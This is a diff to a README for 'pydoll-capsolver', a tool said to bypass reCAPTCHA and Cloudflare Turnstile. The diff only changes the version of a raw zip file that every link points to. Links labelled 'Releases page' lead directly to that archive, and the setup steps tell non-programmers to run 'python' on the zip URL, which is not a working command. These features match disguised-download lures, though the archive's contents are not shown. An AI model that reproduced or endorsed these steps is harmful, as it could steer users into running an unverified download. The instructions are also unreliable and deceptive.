@@ -1,6 +1,6 @@
 # 🤖 pydoll-capsolver - Automate Web Tasks with Ease
 
-[![Download pydoll-capsolver](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip)](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip)
+[![Download pydoll-capsolver](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip)](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip)
 
 ## 📝 Overview
 pydoll-capsolver offers a simple way to automate web tasks while mimicking human actions. With this tool, you can bypass security measures like reCAPTCHA and Cloudflare Turnstile, ensuring a seamless web interaction experience. 
@@ -9,7 +9,7 @@ pydoll-capsolver offers a simple way to automate web tasks while mimicking human
 To begin using pydoll-capsolver, follow these clear steps. No programming knowledge is required.
 
 ### 📥 Download & Install
-1. Visit the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip) to download the latest version.
+1. Visit the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip) to download the latest version.
 2. Locate the file suitable for your operating system (Windows, macOS, or Linux).
 3. Download the file by clicking on it.
 4. Once the download is complete, find the file in your downloads folder or the location you selected.
@@ -33,7 +33,7 @@ Before running pydoll-capsolver, make sure your system meets the following requi
    ```
 5. Run the command:
    ```
-   python https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip
+   python https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip
    ```
 
 #### For macOS and Linux:
@@ -46,7 +46,7 @@ Before running pydoll-capsolver, make sure your system meets the following requi
    ```
 5. Execute the following command:
    ```
-   python3 https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip
+   python3 https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip
    ```
 
 ## 📖 Usage Guide
@@ -73,9 +73,9 @@ If you encounter issues while using pydoll-capsolver, consider the following sol
 For any additional questions or detailed issues, check the community forum or support resources linked on the Releases page.
 
 ## 💬 Community and Support
-Engage with the community for tips and tricks or to report issues. You can find discussions and support options linked on the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip).
+Engage with the community for tips and tricks or to report issues. You can find discussions and support options linked on the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip).
 
 ## 📜 License
 pydoll-capsolver is open-source software licensed under the MIT License. This means you can freely use, modify, and redistribute it.
 
-For more information, visit the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-v1.9.zip) to explore updates and contribute to the project.
+For more information, visit the [Releases page](https://github.com/FarofeiroBR/pydoll-capsolver/raw/refs/heads/main/gobonated/capsolver-pydoll-2.5-alpha.3.zip) to explore updates and contribute to the project.
